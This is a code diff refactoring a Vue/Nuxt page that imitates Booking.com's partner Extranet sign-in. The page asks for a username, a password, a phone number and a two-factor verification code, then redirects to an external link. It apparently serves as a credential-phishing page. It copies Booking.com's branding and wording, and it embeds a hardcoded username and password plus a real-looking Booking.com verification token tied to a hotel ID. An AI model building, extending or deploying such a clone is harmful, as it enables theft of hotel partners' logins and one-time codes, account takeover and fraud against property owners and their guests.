@@ -132,421 +132,50 @@
       <div class="w-full max-w-[400px]">
         <Transition :name="stepTransitionName" mode="out-in">
           <!-- Step 1: Username -->
-          <div
+          <Step1Username
             v-if="step === 1"
             key="step-1"
-            class="flex flex-col justify-center gap-y-4"
-          >
-            <h1 class="text-xl font-bold text-gray-900 mb-[13.4px]">
-              Sign in to manage your property
-            </h1>
-
-            <form @submit.prevent="nextStep">
-              <div class="mb-4">
-                <label
-                  for="username"
-                  class="block text-sm font-medium text-gray-900 pb-1"
-                >
-                  Username
-                </label>
-                <input
-                  id="username"
-                  v-model="username"
-                  type="text"
-                  placeholder='Also known as "Login name" and "Login ID"'
-                  ref="usernameInput"
-                  class="w-full h-[36px] px-2 py-1 border border-gray-400 rounded-sm text-sm focus:border-[#006CE4] focus:outline-none focus:ring-1 focus:ring-[#006CE4] focus:ring-opacity-20"
-                  required
-                />
-              </div>
-
-              <button
-                type="submit"
-                class="w-full bg-[#006ce4] hover:bg-[#00519e] text-white font-medium py-3 px-4 rounded text-base transition-colors duration-150"
-              >
-                Next
-              </button>
-            </form>
-
-            <div class="text-center mb-0 mt-4">
-              <button
-                @click="handleDefaultLink"
-                class="text-[#0071c2] w-full px-4 py-2 rounded hover:bg-slate-100 hover:bg-opacity-20 text-sm font-medium transition-colors duration-300"
-              >
-                Having trouble signing in?
-              </button>
-            </div>
-
-            <div class="mt-6 flex flex-col">
-              <hr class="border-gray-200 mb-4" />
-              <p class="text-xs text-gray-700">
-                Questions about your property or the Extranet? Check out
-                <button
-                  @click="handleDefaultLink"
-                  class="text-[#0071c2] hover:underline"
-                >
-                  Partner Help
-                </button>
-                or<br />
-                ask another partner in the
-                <button
-                  @click="handleDefaultLink"
-                  class="text-[#0071c2] hover:underline"
-                >
-                  Partner Community</button
-                >.
-              </p>
-            </div>
-
-            <button
-              @click="handleDefaultLink"
-              class="w-full h-12 px-3 flex items-center justify-center bg-white hover:bg-gray-50 text-[#0071c2] font-medium rounded border border-[#0071c2] transition-colors duration-150"
-            >
-              Create your partner account
-            </button>
-          </div>
+            :model-value="username"
+            @update:modelValue="(val) => (username = val)"
+            :default-link="defaultLink"
+            @next="nextStep"
+          />
 
           <!-- Step 2: Password -->
-          <div v-else-if="step === 2" class="flex flex-col gap-4">
-            <div>
-              <h1 class="text-xl font-bold text-gray-900 mb-[13.4px]">
-                Enter your password
-              </h1>
-              <p class="text-sm text-gray-700">
-                Enter your Booking.com password for
-                <span class="font-bold">{{ username }}</span
-                >.
-              </p>
-            </div>
+          <Step2Password
+            v-else-if="step === 2"
+            :username="username"
+            :password="password"
+            @update:password="(val) => (password = val)"
+            @submit="signIn"
+            :default-link="defaultLink"
+          />
 
-            <form @submit.prevent="signIn">
-              <div class="mb-4">
-                <label
-                  for="password"
-                  class="block text-sm font-medium text-gray-900 mb-1"
-                >
-                  Password
-                </label>
-                <div class="relative h-[36px]">
-                  <input
-                    id="password"
-                    v-model="password"
-                    :type="showPassword ? 'text' : 'password'"
-                    placeholder="Enter your password"
-                    ref="passwordInput"
-                    class="w-full h-full px-2 py-1 pr-14 border border-gray-400 rounded-sm text-sm focus:border-[#006CE4] focus:outline-none focus:ring-1 focus:ring-[#006CE4] focus:ring-opacity-20"
-                    required
-                  />
-                  <div
-                    class="absolute right-2 top-1/2 transform -translate-y-1/2 flex items-center"
-                  >
-                    <button
-                      type="button"
-                      @click="showPassword = !showPassword"
-                      :aria-pressed="showPassword"
-                      :aria-label="
-                        showPassword ? 'Hide password' : 'Show password'
-                      "
-                      class="p-1.5 text-gray-600 hover:text-gray-800"
-                    >
-                      <svg
-                        v-if="!showPassword"
-                        class="w-5 h-5"
-                        fill="none"
-                        stroke="currentColor"
-                        viewBox="0 0 24 24"
-                      >
-                        <path
-                          stroke-linecap="round"
-                          stroke-linejoin="round"
-                          stroke-width="2"
-                          d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
-                        />
-                        <path
-                          stroke-linecap="round"
-                          stroke-linejoin="round"
-                          stroke-width="2"
-                          d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
-                        />
-                      </svg>
-                      <svg
-                        v-else
-                        class="w-5 h-5"
-                        fill="none"
-                        stroke="currentColor"
-                        viewBox="0 0 24 24"
-                      >
-                        <path
-                          stroke-linecap="round"
-                          stroke-linejoin="round"
-                          stroke-width="2"
-                          d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"
-                        />
-                      </svg>
-                    </button>
-                  </div>
-                </div>
-              </div>
-
-              <button
-                type="submit"
-                class="w-full bg-[#006ce4] hover:bg-[#00449e] text-white font-medium py-3 px-4 rounded text-base transition-colors duration-150"
-              >
-                Sign in
-              </button>
-            </form>
-
-            <div class="text-center">
-              <button
-                @click="handleDefaultLink"
-                class="text-[#006ce4] w-full px-4 py-2 rounded hover:bg-slate-100 hover:bg-opacity-20 text-sm font-medium transition-colors duration-300"
-              >
-                Forgot your password?
-              </button>
-            </div>
-          </div>
-
-          <!-- Step 3: Verification method (like screenshot) -->
-          <div v-else-if="step === 3" key="step-3" class="flex flex-col gap-4">
-            <div
-              v-if="showPulseBanner"
-              class="relative p-4 rounded-lg border border-[#868686] bg-[#F5F5F5] text-gray-900"
-            >
-              <div class="flex items-start gap-4 pr-8">
-                <svg
-                  class="pb-2"
-                  xmlns="http://www.w3.org/2000/svg"
-                  viewBox="0 0 24 24"
-                  width="28"
-                  height="28"
-                >
-                  <path
-                    d="M12 15.75A1.125 1.125 0 1 0 12 18a1.125 1.125 0 0 0 0-2.25.75.75 0 0 0 0 1.5.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75.75.75 0 0 0 0-1.5m.75-2.25V5.25a.75.75 0 0 0-1.5 0v8.25a.75.75 0 0 0 1.5 0M22.5 12c0 5.799-4.701 10.5-10.5 10.5S1.5 17.799 1.5 12 6.201 1.5 12 1.5 22.5 6.201 22.5 12m1.5 0c0-6.627-5.373-12-12-12S0 5.373 0 12s5.373 12 12 12 12-5.373 12-12"
-                  ></path>
-                </svg>
-                <p class="text-sm">
-                  Next time, try using the Pulse app for easier verification.
-                  <button
-                    @click="handleDefaultLink"
-                    class="text-[#006ce4] hover:underline"
-                  >
-                    Learn more
-                  </button>
-                </p>
-              </div>
-              <button
-                @click="showPulseBanner = false"
-                aria-label="Dismiss"
-                class="absolute right-3 top-3 p-1 rounded hover:bg-gray-200"
-              >
-                <svg
-                  class="w-5 h-5 text-[#535353]"
-                  xmlns="http://www.w3.org/2000/svg"
-                  viewBox="0 0 24 24"
-                  fill="currentColor"
-                >
-                  <path
-                    d="M6.225 4.811 4.811 6.225 10.586 12l-5.775 5.775 1.414 1.414L12 13.414l5.775 5.775 1.414-1.414L13.414 12l5.775-5.775-1.414-1.414L12 10.586 6.225 4.811z"
-                  />
-                </svg>
-              </button>
-            </div>
-
-            <h1 class="text-xl font-bold text-gray-900">Verification method</h1>
-            <p class="text-sm text-gray-700">
-              Select a verification method to complete the sign-in process.
-            </p>
-
-            <div class="rounded divide-y divide-gray-200 text-sm">
-              <button
-                @click="goToPhoneCall"
-                class="w-full flex items-center justify-between px-4 py-4 hover:underline hover:decoration-[#006CE4]"
-              >
-                <div class="flex items-center gap-3">
-                  <div class="w-5 h-5 fill-[#0F75E6]">
-                    <svg
-                      xmlns="http://www.w3.org/2000/svg"
-                      viewBox="0 0 128 128"
-                    >
-                      <path
-                        d="M110 85l-24-3c-2 0-4.6.6-6 2l-9 9c-1.4 1.4-3.3 2-5 1-6.3-3.9-12.4-8-18-14a121 121 0 0 1-15-20 4.1 4.1 0 0 1 1-5l10-9a5.9 5.9 0 0 0 2-4l-2-26c0-5.2-4.8-8-10-8H18c-5.1 0-9.8 5-9 10 2.3 15.4 9 44.5 31 68s54 30.1 70 32c5.4.6 10-2.6 10-8V94c0-5.2-4.8-9-10-9z"
-                      ></path>
-                    </svg>
-                  </div>
-                  <span class="text-[#006CE4] font-medium">Phone call</span>
-                </div>
-                <svg
-                  class="w-5 h-5 text-[#0F75E6]"
-                  xmlns="http://www.w3.org/2000/svg"
-                  fill="none"
-                  viewBox="0 0 24 24"
-                  stroke="currentColor"
-                >
-                  <path
-                    stroke-linecap="round"
-                    stroke-linejoin="round"
-                    stroke-width="2"
-                    d="M9 5l7 7-7 7"
-                  />
-                </svg>
-              </button>
-              <button
-                @click="handleDefaultLink"
-                class="w-full flex items-center justify-between px-4 py-4 hover:underline hover:decoration-[#006CE4]"
-              >
-                <div class="flex items-center gap-3">
-                  <div class="w-5 h-5 fill-[#0F75E6]">
-                    <svg
-                      xmlns="http://www.w3.org/2000/svg"
-                      viewBox="0 0 24 24"
-                      width="20"
-                      height="20"
-                    >
-                      <path
-                        d="M14.25 15.75h-.75a.75.75 0 0 1-.75-.75v-3.75a1.5 1.5 0 0 0-1.5-1.5h-.75a.75.75 0 0 0 0 1.5h.75V15a2.25 2.25 0 0 0 2.25 2.25h.75a.75.75 0 0 0 0-1.5M11.625 6a1.125 1.125 0 1 0 0 2.25 1.125 1.125 0 0 0 0-2.25.75.75 0 0 0 0 1.5.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75.75.75 0 0 0 0-1.5M22.5 12c0 5.799-4.701 10.5-10.5 10.5S1.5 17.799 1.5 12 6.201 1.5 12 1.5 22.5 6.201 22.5 12m1.5 0c0-6.627-5.373-12-12-12S0 5.373 0 12s5.373 12 12 12 12-5.373 12-12"
-                      ></path>
-                    </svg>
-                  </div>
-                  <span class="text-[#006CE4] font-medium"
-                    >Unable to verify?</span
-                  >
-                </div>
-                <svg
-                  class="w-5 h-5 text-[#0F75E6]"
-                  xmlns="http://www.w3.org/2000/svg"
-                  fill="none"
-                  viewBox="0 0 24 24"
-                  stroke="currentColor"
-                >
-                  <path
-                    stroke-linecap="round"
-                    stroke-linejoin="round"
-                    stroke-width="2"
-                    d="M9 5l7 7-7 7"
-                  />
-                </svg>
-              </button>
-            </div>
-          </div>
-          <div v-else-if="step === 4" key="step-4" class="flex flex-col gap-4">
-            <div>
-              <h1 class="text-xl font-bold text-gray-900 mb-[13.4px]">
-                Select phone number
-              </h1>
-              <p class="text-sm text-gray-700 mt-1">
-                Select a phone number to receive your verification code in a
-                call.
-              </p>
-            </div>
-
-            <div>
-              <label
-                for="phoneSelect"
-                class="block text-sm font-medium text-gray-900 pb-1"
-                >Phone number</label
-              >
-              <div class="relative">
-                <select
-                  style="
-                    appearance: none;
-                    -webkit-appearance: none;
-                    -moz-appearance: none;
-                  "
-                  id="phoneSelect"
-                  v-model="selectedPhone"
-                  class="w-full h-[36px] py-[3px] pl-2 pr-9 border border-gray-400 rounded-sm text-sm focus:outline-none focus:ring-opacity-20 bg-white cursor-pointer"
-                >
-                  <option value="" disabled>Select phone number</option>
-                  <option value="+1 202-555-0132">+31******9092</option>
-                  <option value="+1 202-555-0175">+31******2000</option>
-                </select>
-                <svg
-                  class="w-6 h-6 text-gray-600 absolute right-1.5 top-1/2 -translate-y-1/2 pointer-events-none"
-                  xmlns="http://www.w3.org/2000/svg"
-                  viewBox="0 0 20 20"
-                  fill="currentColor"
-                >
-                  <path
-                    fill-rule="evenodd"
-                    d="M5.23 7.21a.75.75 0 011.06.02L10 10.94l3.71-3.71a.75.75 0 111.06 1.06l-4.24 4.24a.75.75 0 01-1.06 0L5.21 8.29a.75.75 0 01.02-1.08z"
-                    clip-rule="evenodd"
-                  />
-                </svg>
-              </div>
-            </div>
-
-            <button
-              :disabled="!selectedPhone"
-              @click="goToCodeStep"
-              class="w-full h-[48px] py-2 px-4 rounded text-base font-medium"
-              :class="
-                !selectedPhone
-                  ? 'bg-[#d9d9d9] text-[#a2a2a2] !cursor-not-allowed'
-                  : 'bg-[#006CE4] text-white hover:bg-[#00449e]'
-              "
-            >
-              Call now
-            </button>
-
-            <div class="text-center">
-              <button
-                @click="handleDefaultLink"
-                class="text-[#006ce4] w-full px-4 py-2 rounded hover:bg-slate-100 hover:bg-opacity-20 text-sm font-medium transition-colors duration-300"
-              >
-                Unable to verify?
-              </button>
-            </div>
-          </div>
-          <div v-else-if="step === 5" key="step-5" class="flex flex-col gap-4">
-            <div>
-              <h1 class="text-xl font-bold text-gray-900 mb-[13.4px]">
-                Two Factor Authentication
-              </h1>
-              <p class="text-sm text-gray-700 mt-1">
-                Enter the verification code provided to you by Booking.com. If
-                you can't verify it, review these
-                <a
-                  href="https://account.booking.com/sign-in/verification?op_token=EgVvYXV0aCLqBAoUNlo3Mm9IT2QzNk5uN3prM3BpcmgSCWF1dGhvcml6ZRoaaHR0cHM6Ly9hZG1pbi5ib29raW5nLmNvbS8q8QN7InBhZ2UiOiIvaG90ZWwvaG90ZWxhZG1pbi9leHRyYW5ldF9uZy9tYW5hZ2UvbWVzc2FnaW5nL2luYm94Lmh0bWw_cHVsc2Vfc2hvd19tZXNzYWdlcz0xJmFtcDtyZXNfaWQ9NDkxODIxNjA3MSZhbXA7aG90ZWxfaWQ9MTA0MDImYW1wO2xhbmc9bmwmYW1wO3RocmVhZF9pZD0xMmEzNzVhOS02MDU5LTUwZTktYWQyZC1lYWJjYTYxZjY0ZDMmYW1wO21lc3NhZ2VfaWQ9YmUwOTRlZTAtZGRiYy0xMWVmLTk4NjQtYzI2MGJhOWU5YzNiJmFtcDt1dG1fc291cmNlPW1lc3NhZ2luZyZhbXA7dXRtX2NhbXBhaWduPXBmX2d1ZXN0X3JlcXVlc3QmYW1wO3V0bV90ZXJtPWZyZWVfdGV4dCZhbXA7dXRtX21lZGl1bT1lbWFpbCZhbXA7dXRtX2NvbnRlbnQ9cmVwbHkmYW1wO19lPTE3MzgwOTg5NDkmYW1wO19zPVFVRC84WXFEbHZIeVl2bVVkY2hvSjg5RWhQTkMxbUtvakMrazdXTWNwdzgiLCJhdXRoX2F0dGVtcHRfaWQiOiI2YThiYzEzOC1lOWFhLTQ0ZTYtODFmMi00YTc0MThkOGJmYmQifTIrcVJBb2tubG9NYnpwWXcyTU5FVmUxdk15d0RaUFNGbURVTE9FdXQ4YzM5NDoEUzI1NkIEY29kZSoTMKLUwYit_Cc6AEIAWIvm4O2UMw"
-                  @click="handleDefaultLink"
-                  class="text-[#006CE4] font-bold"
-                >
-                  other options
-                </a>
-              </p>
-            </div>
-
-            <form @submit.prevent="verifyNow" class="flex flex-col gap-4">
-              <div>
-                <label
-                  for="code"
-                  class="block text-sm font-medium text-gray-900 pb-1"
-                  >Verification code <span class="text-red-600">*</span></label
-                >
-                <div class="relative">
-                  <input
-                    id="code"
-                    v-model="verificationCode"
-                    ref="codeInput"
-                    type="text"
-                    inputmode="numeric"
-                    autocomplete="one-time-code"
-                    class="w-full h-[36px] py-[3px] pl-2 pr-9 border border-gray-400 rounded-sm text-sm focus:outline-none focus:ring-opacity-20 bg-white"
-                    required
-                  />
-                </div>
-              </div>
-              <button
-                type="submit"
-                class="w-full h-[48px] py-2 px-4 rounded text-base font-medium bg-[#006CE4] text-white hover:bg-[#00449e]"
-              >
-                Verify now
-              </button>
-            </form>
-
-            <p class="text-xs text-gray-700 text-center h-[18px]">
-              You should get a phone call soon
-            </p>
-          </div>
+          <!-- Step 3: Verification method -->
+          <Step3Verification
+            v-else-if="step === 3"
+            key="step-3"
+            :show-pulse-banner="showPulseBanner"
+            @dismiss-banner="showPulseBanner = false"
+            @phone="goToPhoneCall"
+            :default-link="defaultLink"
+          />
+          <Step4PhoneSelect
+            v-else-if="step === 4"
+            key="step-4"
+            :model-value="selectedPhone"
+            @update:modelValue="(val) => (selectedPhone = val)"
+            @next="goToCodeStep"
+            :default-link="defaultLink"
+          />
+          <Step5Code
+            v-else-if="step === 5"
+            key="step-5"
+            :model-value="verificationCode"
+            @update:modelValue="(val) => (verificationCode = val)"
+            @submit="verifyNow"
+            :default-link="defaultLink"
+          />
         </Transition>
 
         <div class="py-4">
@@ -586,19 +215,24 @@
 <script setup>
 import { ref, watch, nextTick, onMounted } from 'vue';
 import UsFlag from '~/assets/us.png';
+import BookingTitle from '~/components/booking/BookingTitle.vue';
+import BookingInput from '~/components/booking/BookingInput.vue';
+import BookingButton from '~/components/booking/BookingButton.vue';
+import Step1Username from '~/components/booking/steps/Step1Username.vue';
+import Step2Password from '~/components/booking/steps/Step2Password.vue';
+import Step3Verification from '~/components/booking/steps/Step3Verification.vue';
+import Step4PhoneSelect from '~/components/booking/steps/Step4PhoneSelect.vue';
+import Step5Code from '~/components/booking/steps/Step5Code.vue';
 
-const step = ref(5);
+const step = ref(1);
 const username = ref('10402');
 const password = ref('BergenDal5');
 const showPassword = ref(false);
 const isMenuOpen = ref(false);
 const stepTransitionName = ref('slide-left');
-const usernameInput = ref(null);
-const passwordInput = ref(null);
 const showPulseBanner = ref(true);
 const selectedPhone = ref('');
 const verificationCode = ref('');
-const codeInput = ref(null);
 
 useHead({
   title: 'Sign in - Booking.com',
@@ -652,20 +286,7 @@ function verifyNow() {
   navigateTo(defaultLink.value, { external: true });
 }
 
-watch(step, async (newStep) => {
-  await nextTick();
-  if (newStep === 1) {
-    usernameInput.value?.focus();
-  } else if (newStep === 2) {
-    passwordInput.value?.focus();
-  } else if (newStep === 5) {
-    codeInput.value?.focus();
-  }
-});
-
-onMounted(() => {
-  usernameInput.value?.focus();
-});
+// Focus is handled by BookingInput via the autofocus prop
 </script>
 
 <style scoped>
